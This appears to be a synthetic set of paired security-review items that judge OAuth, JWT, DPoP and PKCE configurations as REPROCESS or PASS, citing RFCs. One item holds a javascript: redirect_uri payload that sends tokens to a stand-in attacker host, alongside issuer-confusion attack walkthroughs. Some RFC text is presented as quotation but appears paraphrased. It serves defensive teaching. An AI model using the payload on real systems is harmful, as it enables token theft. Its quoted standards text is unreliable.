# CB4 Stage 3 — Action 3 Extended Pair Set
# Node: Node 8 (Arbiter Units) — ext33
# Sequences: CB4-3.4-855 through CB4-3.4-862
# Instances: 16 (8 base pairs × 2 phrasings each)
# Stratum: A/B/D (new domains: JWT iss substring match, DPoP ath claim, PKCE verifier entropy, redirect URI scheme)
# Running total after this file: 1724 instances (862 base pairs)

---

## Pair[CB4-3.4-855]

### A
JWT iss claim validated with substring/prefix match instead of exact string comparison:

A resource server validates incoming JWT access tokens by checking whether the iss claim contains the string "as.example.com" (substring match). Tokens with iss values such as "https://as.example.com/", "https://as.example.com/tenant1", or "https://evil-as.example.com/" would all pass the iss check since all contain "as.example.com". The team states: "We use a contains check to handle both our staging and production issuer URLs in the same validation path."

### B
REPROCESS. RFC 7519 §4.1.1 requires case-sensitive string comparison for the iss claim. Substring matching creates an issuer confusion attack surface.

RFC 7519 §4.1.1: "The issuer claim value is a case-sensitive string." The comparison semantics are defined implicitly by the general RFC 7519 requirement and made explicit in RFC 9068 §4 (JWT Access Tokens): the iss claim MUST be an exact identifier, and RS validation must confirm the token was issued by the specific expected AS. Substring matching violates this requirement.

Attack vector: an attacker who controls "https://evil-as.example.com/" can issue JWT access tokens with iss = "https://evil-as.example.com/". The substring check for "as.example.com" passes — "evil-as.example.com" contains the target string. The attacker's tokens pass iss validation at any RS using substring matching. The attacker also needs to pass signature validation; however, in multi-tenant environments with JWKS discovery, the RS may fetch JWKS from the iss value's discovery URL, which the attacker controls. Substring-based iss validation is the enabler for this attack.

Staging/production argument: using a single contains check to handle multiple environments is rejected as a security design pattern. The correct approach is an allowlist of exact issuer values (one entry per legitimate environment). A contains check is never the correct iss validation mechanism.

RFC 9068 §4 + RFC 7519 §4.1.1 exact comparison requirement violated. REPROCESS.

### Reason
RFC 7519 §4.1.1 requires case-sensitive string (exact) comparison for iss. Substring match allows attacker-controlled issuers to pass validation. The staging/production multi-environment argument is addressed by an allowlist of exact issuers. REPROCESS.

### Phrasing-B
REPROCESS — JWT iss validated with substring match instead of exact comparison. RFC 7519 §4.1.1 + RFC 9068 §4 violated.

RS checks iss.contains("as.example.com"). Attack: iss = "https://evil-as.example.com/" contains target string — passes validation. In JWKS discovery mode, RS fetches keys from attacker-controlled discovery URL. Attacker issues forged tokens that pass both iss and signature validation.

Multi-environment argument rejected: allowlist of exact issuer strings (staging: "https://staging-as.example.com/"; production: "https://as.example.com/") is the correct approach. Substring match is never valid for issuer validation. REPROCESS.

---

## Pair[CB4-3.4-856]

### A
JWT iss claim validated with exact case-sensitive string comparison against configured allowlist:

The resource server validates the JWT iss claim against a configured allowlist of exact issuer identifiers: ["https://as.example.com/"]. The comparison is case-sensitive byte-for-byte. If the iss value does not exactly match one of the allowlist entries, the token is rejected with 401. The allowlist is per-environment (staging and production have separate RS deployments with separate allowlists).

### B
PASS. RFC 7519 §4.1.1 iss validation implemented correctly with exact case-sensitive string comparison.

Allowlist approach: exact issuer identifiers configured per environment. No substring, prefix, suffix, or regular-expression matching. Case-sensitive comparison: "https://as.example.com/" is distinct from "https://As.Example.Com/" — the comparison rejects case variants. Tokens from any other issuer — including subdomains, alternate paths, or unrelated issuers — fail iss validation regardless of signature validity.

Per-environment allowlist: staging and production RSes each validate against their respective AS's exact issuer identifier. No single contains-check attempting to serve multiple environments simultaneously. Separation of environments is maintained at the validation layer.

RFC 7519 §4.1.1 case-sensitive string comparison satisfied. RFC 9068 §4 exact issuer validation satisfied. Issuer confusion attacks blocked at iss validation layer. No findings. PASS.

### Reason
RFC 7519 §4.1.1 exact case-sensitive iss comparison satisfied. Allowlist per environment prevents substring/prefix attacks. No issuer confusion surface. PASS.

### Phrasing-B
PASS — JWT iss validated with exact case-sensitive allowlist comparison per RFC 7519 §4.1.1.

Allowlist: ["https://as.example.com/"] exact strings. Case-sensitive byte comparison. Separate allowlists per environment. Any token with iss ≠ exact allowlist entry rejected with 401. Issuer confusion attack (evil-as.example.com) blocked. RFC 7519 §4.1.1 + RFC 9068 §4 satisfied. PASS.

---

## Pair[CB4-3.4-857]

### A
DPoP proof presented at resource server without ath (access token hash) claim:

A resource server accepts DPoP-bound access tokens. Client presents a DPoP proof JWT containing htm (HTTP method), htu (HTTP URI), iat, and jti claims but no ath (access token hash) claim. The client argues: "The access token is already in the Authorization header — the RS can correlate them without requiring ath in the DPoP proof."

### B
REPROCESS. RFC 9449 §4.2 states: "The DPoP proof JWT MUST contain ... an ath (access token hash) claim" when presented at a resource server. This is an unconditional MUST.

The ath claim's purpose is explicit binding between the DPoP proof and the specific access token presented with it. The ath value is BASE64URL(SHA256(ASCII(access_token))). Without ath, the DPoP proof is not cryptographically bound to the specific access token — the proof and the token are independently valid credentials that happen to be presented together, but an attacker who intercepts the access token can pair it with a new DPoP proof generated with their own key pair.

The "RS can correlate without ath" argument is rejected. The RS can observe both the access token and the DPoP proof in the same request, but without ath, it cannot verify that the DPoP proof was generated specifically for this access token (not a reused proof from a different request). The ath claim is the cryptographic linkage that makes DPoP sender-constrained — without it, the access token is functionally unconstrained because an attacker can substitute their own DPoP proof for the legitimate holder's proof.

Attack path without ath: attacker intercepts access token. They generate a new DPoP key pair and create a DPoP proof for the target URI. They present the stolen access token with their DPoP proof. Without ath, the RS validates: DPoP proof signature (valid, attacker's key), htm/htu match (valid, correct endpoint), jti (valid, fresh). The proof passes. The attacker successfully uses the stolen token.

RFC 9449 §4.2 MUST ath: violated. REPROCESS.

### Reason
RFC 9449 §4.2 MUST ath claim in DPoP proof when presented at RS. Without ath, DPoP proof is not cryptographically bound to the specific access token — attacker can substitute their own DPoP proof with a stolen token. "RS can correlate without ath" rejected. REPROCESS.

### Phrasing-B
REPROCESS — DPoP proof at RS without ath claim. RFC 9449 §4.2 MUST ath violated.

ath claim: BASE64URL(SHA256(ASCII(access_token))). Binds the DPoP proof to the specific access token cryptographically. Without ath: stolen token + new DPoP proof from attacker's key pair = valid request at RS (DPoP proof validates; no ath cross-check fails the attacker).

"RS can correlate without ath" rejected: visual co-presence of token and proof is not cryptographic binding. The ath claim is the requirement that makes DPoP sender-constrained; its absence makes the proof and token independently usable by any party. RFC 9449 §4.2 MUST: violated. REPROCESS.

---

## Pair[CB4-3.4-858]

### A
DPoP proof with ath, htm, htu, iat, and jti claims; RS validates all required fields:

A resource server validates DPoP-bound access tokens. The client presents a DPoP proof JWT containing: ath = BASE64URL(SHA256(ASCII(access_token_value))), htm = "POST", htu = "https://api.example.com/data", iat = current epoch (within 60-second window), and jti = UUID v4. The RS validates: DPoP proof signature, all required claims present, ath cross-checks against the received access token, htm matches request method, htu matches request URI, iat is fresh, jti not seen before. The cnf/jkt in the access token matches the public key in the DPoP proof header.

### B
PASS. RFC 9449 §4.2 DPoP proof requirements fully satisfied at RS.

ath: BASE64URL(SHA256(ASCII(access_token_value))) — cryptographic binding between DPoP proof and specific access token. RS cross-checks: ath recomputed from received access token matches ath in proof. Access token theft renders the stolen token non-functional without the legitimate holder's DPoP private key, because any attacker-generated proof would produce a different ath value if they try to change the access token, or fail the cnf/jkt check if they try to use a different key.

htm/htu: bound to the specific HTTP method and URI. DPoP proof is not reusable across endpoints or methods. jti: UUID v4 per proof; RS tracks jti to prevent replay within the proof's validity window. iat: freshness enforced by RS (60-second window). cnf/jkt: RS validates that the public key in the DPoP proof header matches the cnf/jkt thumbprint in the access token — confirms the same key pair is consistently used.

All RFC 9449 §4.2 requirements satisfied. Token is sender-constrained — stolen access token cannot be used without the corresponding DPoP private key. No findings. PASS.

### Reason
RFC 9449 §4.2 fully satisfied: ath (token binding), htm/htu (request binding), iat (freshness), jti (replay prevention), cnf/jkt cross-check (key consistency). Token is sender-constrained. PASS.

### Phrasing-B
PASS — DPoP proof with all RFC 9449 §4.2 required claims; RS validates all fields including ath cross-check.

ath: SHA256(access_token) — confirmed token binding. htm/htu: request method and URI bound. iat: within 60-second freshness window. jti: UUID v4, tracked by RS for replay prevention. cnf/jkt: DPoP public key matches access token cnf thumbprint. All RFC 9449 §4.2 requirements met. Token is sender-constrained — theft without private key is non-exploitable. PASS.

---

## Pair[CB4-3.4-859]

### A
PKCE code_verifier generated from current Unix timestamp:

A native mobile application generates its PKCE code_verifier by converting the current Unix timestamp in milliseconds to a string (e.g., "1746432987123"). This produces a 13-character string. The code_challenge is SHA256(timestamp_string) encoded as BASE64URL. Team: "Timestamps are unique per request — no two requests share the same millisecond."

### B
REPROCESS. RFC 7636 §4.1 requires the code_verifier to be generated with "sufficient entropy so that it is computationally infeasible to guess the value." A timestamp-based verifier violates this requirement in multiple dimensions.

RFC 7636 §4.1: "The client MUST generate a fresh code_verifier per authorization code transaction using a high-entropy cryptographic random number generator." Timestamp is not a cryptographic random number generator.

Entropy analysis: Unix timestamp in milliseconds has approximately log2(1000) ≈ 10 bits of uncertainty per second. An attacker who can estimate when the authorization request was made (which is possible from network timing, user session logs, or social engineering) can enumerate all timestamp values within a ±5 second window — 10,000 values. With 10,000 guesses against a 15-minute code window, the code_verifier is brute-forceable in practice.

Length violation: 13 characters is below the RFC 7636 §4.1 minimum of 43 characters. Even if timestamp-based generation were secure (it is not), the length alone is a violation. RFC 7636 §4.1: "code_verifier = 43*128unreserved-char."

"Unique per request" argument: uniqueness is not the same as unpredictability. A sequence number is unique per request but equally brute-forceable. PKCE requires cryptographic unguessability, not mere uniqueness.

RFC 7636 §4.1 MUST high-entropy CSPRNG + minimum length violated. REPROCESS.

### Reason
RFC 7636 §4.1 MUST high-entropy CSPRNG violated — timestamp is predictable, not cryptographically random. Also violates 43-character minimum length (13 chars from timestamp). PKCE code_verifier must be unguessable, not merely unique. REPROCESS.

### Phrasing-B
REPROCESS — PKCE code_verifier from Unix timestamp. RFC 7636 §4.1 MUST high-entropy CSPRNG violated. Length also below 43-char minimum.

Timestamp-based verifier: ~10 bits/second entropy; attacker with ±5s timing estimate → 10,000 enumeration candidates → brute-forceable within 15-minute code window. Not a CSPRNG.

13 characters: below RFC 7636 §4.1 minimum of 43 characters for code_verifier.

"Unique per request" ≠ unpredictable: uniqueness prevents reuse; unpredictability prevents guessing. PKCE requires both. REPROCESS on both entropy and length requirements.

---

## Pair[CB4-3.4-860]

### A
PKCE code_verifier generated with CSPRNG; 64 characters; unreserved characters only:

A native mobile application generates PKCE code_verifier using the platform's CSPRNG (SecureRandom on Android, SecRandomCopyBytes on iOS). The verifier is 64 URL-safe base64 characters drawn from the RFC 7636 §4.1 unreserved character set (ALPHA / DIGIT / "-" / "." / "_" / "~"). The corresponding code_challenge is BASE64URL(SHA256(ASCII(verifier))). The verifier is stored in memory only (not persisted to disk or session storage) and cleared immediately after the token exchange.

### B
PASS. RFC 7636 §4.1 code_verifier generation requirements fully satisfied.

CSPRNG: platform-native secure random number generator (SecureRandom/SecRandomCopyBytes) — cryptographically unpredictable. RFC 7636 §4.1 MUST high-entropy cryptographic random number generator: satisfied.

Length: 64 characters — within the 43–128 character range specified by RFC 7636 §4.1. Satisfies both the minimum (43) and maximum (128) constraints. 64-character verifier from unreserved character set: approximately 6 bits per character × 64 characters = 384 bits of entropy — computationally infeasible to guess.

Character set: unreserved characters only per RFC 7636 §4.1 ALPHA / DIGIT / "-" / "." / "_" / "~". No URL-encoding required. Correct.

code_challenge method: BASE64URL(SHA256(ASCII(verifier))) — RFC 7636 §4.2 S256 method. Correct transformation.

Storage: in-memory only, cleared after exchange — not vulnerable to XSS-based exfiltration from storage APIs (ext25 PKCE storage pattern). No findings. PASS.

### Reason
RFC 7636 §4.1 satisfied: CSPRNG, 64-char unreserved string, 384-bit entropy. S256 challenge method correct. In-memory storage prevents XSS exfiltration. PASS.

### Phrasing-B
PASS — PKCE code_verifier from CSPRNG; 64 chars; 384-bit entropy; S256 challenge; in-memory only.

CSPRNG: platform-native secure random (SecureRandom/SecRandomCopyBytes). RFC 7636 §4.1 MUST CSPRNG: satisfied.
Length: 64 chars — within 43–128 range. 6 bits/char × 64 = 384 bits entropy — infeasible to guess.
Character set: unreserved only — RFC 7636 §4.1 compliant.
S256 challenge: BASE64URL(SHA256(ASCII(verifier))) — correct.
Storage: in-memory, cleared post-exchange. PASS.

---

## Pair[CB4-3.4-861]

### A
Authorization server accepts redirect_uri registration with javascript: URI scheme:

An authorization server's client registration endpoint accepts and stores a redirect_uri of "javascript:alert(document.cookie)" for a registered public client. During an authorization flow, the AS redirects the authorization code to this registered URI. The team states: "We validate that redirect_uri at runtime matches what was registered — this is the RFC 6749 requirement. What clients register is their business."

### B
REPROCESS. RFC 6749 §3.1.2 establishes that redirect URI registration must use URIs with appropriate schemes for the client type. ASVS V10.2.1 exact registration combined with CWE-601 (URL Redirection to Untrusted Site) and CWE-79 (XSS) analysis confirms that accepting javascript: scheme URIs constitutes a MUST-level violation.

The AS's responsibility is not merely to enforce runtime match against registered URIs — the AS is responsible for validating that registered URIs are legitimate redirection targets. RFC 6749 §3.1.2 states redirect URIs should be "an absolute URI." The javascript: scheme is not a network-addressable absolute URI for redirection purposes; it is a code execution vector.

Attack path: an attacker registers a client with redirect_uri = "javascript:fetch('https://attacker.example.com/?token='+location.hash)". During a victim's authorization flow against this client, the AS redirects to javascript:..., which executes in the context of the AS's origin. This constitutes stored XSS executed at the AS's origin — the most severe XSS context possible because the AS origin holds authenticated user sessions.

The "runtime match validation" argument is rejected: matching at runtime against a registered javascript: URI does not prevent the attack — it ensures the attack reliably executes. Registration enforcement is the correct control; the AS must validate scheme, host, and path at registration time.

Permitted schemes for web application redirect URIs per RFC 8252 §8.3: https (required for non-localhost web apps), http (localhost only per RFC 8252 §8.3). The javascript: scheme is never a valid redirect URI scheme. REPROCESS.

### Reason
Accepting javascript: scheme redirect URIs enables stored XSS at the AS's origin. RFC 6749 §3.1.2 absolute URI requirement excludes code-execution schemes. AS responsibility includes validating redirect URI schemes at registration, not only matching at runtime. REPROCESS.

### Phrasing-B
REPROCESS — AS accepts javascript: scheme redirect_uri registration. CWE-79 XSS at AS origin.

Attack: client registers redirect_uri = "javascript:...token-exfiltration...". AS validates runtime match against registration (matches). AS redirects authorization code to javascript:..., which executes in AS origin. Stored XSS at AS origin — attacker accesses AS-origin cookies and session state.

"Runtime match is the RFC requirement" rejected: AS must validate URI scheme at registration. javascript: is not a valid redirect scheme per RFC 6749 §3.1.2 (absolute URI for redirection). Permitted: https, http (localhost). Not permitted: javascript:, data:, vbscript:. AS must enforce scheme allowlist at registration time. REPROCESS.

---

## Pair[CB4-3.4-862]

### A
Authorization server enforces redirect URI scheme allowlist at registration; javascript: and data: URIs rejected:

The authorization server's client registration endpoint validates the redirect_uri scheme at registration time. The AS maintains a scheme allowlist: https (required for all non-localhost web application clients), http (allowed only for registered loopback/localhost clients), and custom URI schemes (allowed only for native app clients with pre-validated scheme ownership per RFC 8252 §7.1). URIs with javascript:, data:, vbscript:, or other non-network schemes are rejected with 400 (error: invalid_redirect_uri) at registration. Clients cannot register URIs with code-execution schemes.

### B
PASS. Redirect URI scheme validation at registration correctly prevents code-execution URI injection.

Scheme allowlist: https (web apps), http (localhost), custom schemes (native apps) — the three categories defined by RFC 8252 §7.1, §7.2, and §7.3. This exactly matches the authorized redirect URI scheme categories in RFC 6749 and RFC 8252. Non-network schemes (javascript:, data:, vbscript:) are not in the allowlist and are rejected at registration.

Registration-time validation: blocking javascript: at registration prevents the stored XSS-at-AS-origin attack entirely — no registered URI can be a code-execution vector. Runtime match validation (comparing the redirect_uri in the authorization request against the registered value) continues to apply per ASVS V10.2.1 and RFC 6749 §4.1.1.

Layered protection: scheme validation at registration + exact URI match at runtime = two independent controls. Neither alone is sufficient; both together provide full coverage.

RFC 6749 §3.1.2 absolute URI requirement satisfied with scheme allowlist enforcement. CWE-601 (URL redirection) and CWE-79 (XSS) mitigated at registration layer. No findings. PASS.

### Reason
Redirect URI scheme allowlist at registration correctly blocks javascript:, data:, and other code-execution schemes. https/http(localhost)/custom-scheme categories correctly correspond to RFC 8252 client types. Registration-time + runtime-match = layered protection. PASS.

### Phrasing-B
PASS — AS enforces redirect URI scheme allowlist at registration; javascript: and data: URIs rejected with 400.

Scheme allowlist: https (web apps), http (localhost), custom schemes (native apps per RFC 8252). Non-network schemes rejected at registration. Stored XSS-at-AS-origin attack blocked at registration layer — no javascript: URI can be registered.

Layered: registration scheme validation + RFC V10.2.1 exact-match at runtime. CWE-601 and CWE-79 mitigated. RFC 6749 §3.1.2 absolute URI with valid redirection semantics satisfied. PASS.
